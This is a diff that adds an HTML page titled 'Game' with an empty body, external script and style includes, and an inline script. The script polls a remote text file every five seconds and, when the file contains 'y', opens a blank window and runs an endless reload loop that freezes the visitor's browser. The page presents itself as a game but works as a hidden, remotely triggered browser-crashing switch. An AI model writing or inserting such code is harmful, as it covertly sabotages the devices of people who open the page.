@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Home thing -->
+    <link rel="stylesheet" href="https://awashcard0.pages.dev/home-thing/style.css">
+    <script src='https://awashcard0.pages.dev/home-thing/script.js'></script>
+    <!-- End home thing -->
+    <title>Game</title>
+</head>
+<body>
+    
+</body>
+<script>
+    hello()
+
+function hello() {
+  setTimeout(function() {
+    ya()
+    hello()
+  }, 5000);
+}
+
+function ya() {
+
+    const Http = new XMLHttpRequest();
+    const url='https://httpc.pages.dev/text.txt';
+    Http.open("GET", url);
+    Http.send();
+    
+    Http.onreadystatechange = (e) => {
+      if (Http.responseText.includes("y")) {
+        // alert("Crashed")
+
+        window.open("about:blank")
+
+        while(1)location.reload(1)
+      }
+    }
+    }
+    </script>
+</html>
